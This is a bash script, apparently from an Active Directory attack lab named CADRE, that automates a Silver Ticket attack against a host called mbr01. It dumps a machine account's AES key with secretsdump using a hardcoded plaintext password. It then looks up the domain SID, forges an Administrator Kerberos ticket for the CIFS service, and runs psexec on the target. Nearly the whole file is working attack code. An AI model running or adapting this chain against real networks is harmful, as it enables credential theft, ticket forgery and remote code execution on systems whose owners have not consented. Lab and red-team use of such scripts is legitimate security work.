#!/bin/bash
# CADRE — WT#011 Silver Ticket (CIFS on mbr01.child.cadre.local)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#011 — Silver Ticket"
start_attack "011" "Silver Ticket"

if command -v impacket-ticketer &>/dev/null; then
  TICKETER() { impacket-ticketer "$@"; }
  PSEXEC() { impacket-psexec "$@"; }
  SECRETS() { impacket-secretsdump "$@"; }
elif command -v ticketer.py &>/dev/null; then
  TICKETER() { ticketer.py "$@"; }
  PSEXEC() { psexec.py "$@"; }
  SECRETS() { secretsdump.py "$@"; }
else
  fail "ticketer.py / impacket-ticketer required"
  exit 1
fi

require_env MBR01 "MBR01"
require_env DC02 "DC02"
require_env DOMAIN_CHILD "DOMAIN_CHILD"
require_env NETBIOS_ROOT "NETBIOS_ROOT"

MACHINE="MBR01$"
HASH_FILE="${ATTACKS_DIR:-.}/mbr01_machine_hashes.txt"

step "Step 1: Dump MBR01\$ machine account (child domain)"
run_cmd "SECRETS -just-dc-user '${MACHINE}' -dc-ip \"$DC02\" \"${NETBIOS_ROOT}/chief_command:C0mm@nd_Ch1ef!@${DC02}\" 2>&1 | tee \"$HASH_FILE\""

MBR01_AES=$(grep -m1 "^${MACHINE}:aes256-cts-hmac-sha1-96:" "$HASH_FILE" | cut -d: -f3)
if [[ -z "$MBR01_AES" ]]; then
  fail "MBR01 AES256 key not found"
  exit 1
fi
ok "MBR01 AES256: ${MBR01_AES:0:8}…"

step "Step 2: Resolve child.cadre.local domain SID"
CHILD_SID=$(lookupsid.py "${NETBIOS_ROOT}/chief_command:C0mm@nd_Ch1ef!@${DC02}" 2>/dev/null | grep -m1 'Domain SID' | awk '{print $NF}')
if [[ -z "$CHILD_SID" ]]; then
  fail "child domain SID not found"
  exit 1
fi
ok "Child SID: $CHILD_SID"

SPN="cifs/mbr01.${DOMAIN_CHILD}"
step "Step 3: Forge silver ticket (Administrator → $SPN)"
CCACHE="/tmp/cadre-silver-Administrator.ccache"
rm -f "$CCACHE" /tmp/Administrator.ccache
run_cmd "cd /tmp && TICKETER -aesKey \"$MBR01_AES\" -domain-sid \"$CHILD_SID\" -domain \"$DOMAIN_CHILD\" -spn \"$SPN\" -user-id 500 Administrator"

if [[ -f /tmp/Administrator.ccache ]]; then mv /tmp/Administrator.ccache "$CCACHE"; fi
[[ -f "$CCACHE" ]] || { fail "ccache missing"; exit 1; }

step "Step 4: Test — psexec to mbr01 (no KDC contact for service auth)"
run_cmd "KRB5CCNAME=\"$CCACHE\" PSEXEC -k -no-pass -dc-ip \"$DC02\" -target-ip \"$MBR01\" \"${DOMAIN_CHILD}/Administrator@mbr01.${DOMAIN_CHILD}\" whoami 2>&1"
PSEXEC_RC=$?
[[ $PSEXEC_RC -eq 0 ]] || { fail "silver ticket psexec failed rc=$PSEXEC_RC"; exit 1; }

result 0 "Silver ticket forged and tested on mbr01"
